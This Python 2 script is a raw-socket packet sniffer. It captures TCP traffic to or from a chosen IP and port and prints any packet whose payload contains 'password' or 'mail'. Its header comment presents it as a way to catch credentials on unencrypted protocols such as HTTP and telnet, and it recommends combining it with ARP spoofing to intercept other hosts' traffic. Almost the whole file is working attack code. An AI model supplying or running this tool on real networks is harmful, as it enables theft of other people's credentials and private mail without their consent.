#! /usr/bin/python

# This script helps you catch packets containing defined words. 
# Works with uncrypted protocols such as http , telnet ...
# Interesting to use with any arp spoofing script
#
# By Bloupih
#
# a big thanks to the internet . 

import socket, sys
from struct import *


class Packet:
	"""Packet class"""
	def __init__(self,packet):
		# getting ip header
		ip_header = packet[0:20]

		ipHeader = unpack('!BBHHHBBH4s4s', ip_header)

		version_ip_header_length = ipHeader[0]
		self.version = version_ip_header_length >> 4
		ip_header_length = version_ip_header_length & 0xF
		self.ipHeaderLength = ip_header_length * 4
		self.ttl = int(ipHeader[5])
		self.protocol = ipHeader[6]
		self.sourceAddr = socket.inet_ntoa(ipHeader[8])
		self.destAddr = socket.inet_ntoa(ipHeader[9])

		# getting tcp header
		tcp_header = packet[self.ipHeaderLength:self.ipHeaderLength+20]
			
		tcpHeader = unpack('!HHLLBBHHH', tcp_header)
			
		self.sourcePort = int(tcpHeader[0])
		self.destPort = int(tcpHeader[1])
		self.sequence = tcpHeader[2]	
		self.ack	= tcpHeader[3]
		doff_reserved = tcpHeader[4]
		self.tcpHeaderLength = doff_reserved >> 4
		self.headerSize = self.ipHeaderLength + self.tcpHeaderLength * 4
		self.dataSize = len(packet) - self.headerSize
		self.data = packet[self.headerSize:]

	def match(self,words):
		"""Method that search specified words in the packet's data"""
		if any(word in self.data for word in words):
			return True
		return False



wordList = ['password', 'mail'];

if len(sys.argv) ==2 :
	if ":" in sys.argv[1]:
                datas =  sys.argv[1].split(':')

		checkPort = True
		ip = datas[0]
		port = int(datas[1])
		print datas
	else:
		checkPort = False
		ip = sys.argv[1]

	print 'Now sniffing on : %s (source & dest)' % sys.argv[1]
	print 'Searching for packets containing the following words :', wordList
else:
	print "usage : sniffer.py <ip/all[:port]>"
	print "example 1 : sniffer.py 192.168.1.20 <= scan for any packet from/to 192.168.1.20 (any port)"
	print "example 2 : sniffer.py 192.168.1.20:80 <= scan for any packet from/to 192.168.1.20 on port 80"
	print "example 3 : sniffer.py all <= scan for any packet from/to any ip/port"
	print "example 4 : sniffer.py all:23 <= scan for any packet from/to any ip on port 23"
	sys.exit()

try:
	sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
except socket.error, msg:
	print ("%s : %s" % (msg[0], msg[1]))
	sys.exit()

x=1
while True:
	packet = sock.recvfrom(65565)
	
	packet = Packet(packet[0])

	if ( ip == "all" or ip == packet.destAddr or ip == packet.sourceAddr):
	
		if ( checkPort == False or ( checkPort == True and (port == packet.sourcePort or port == packet.destPort) ) ) and packet.data != '' and packet.match(wordList):

			print '\r\n' * 4
			print ('##################### packet %d ######################' %x)
			print ('source : %s : %d' % (packet.sourceAddr, packet.sourcePort))
			print ('destination : %s : %d' % (packet.destAddr, packet.destPort))
			print ('ttl : %d' % (packet.ttl))
			print ('data size: %d' % (packet.dataSize))
			print ('-------------------')
			print packet.data
			print '\r\n'
			print ('--------------------- end of packet %d ----------------------' %x)
			print '\r\n' * 4
			x +=1

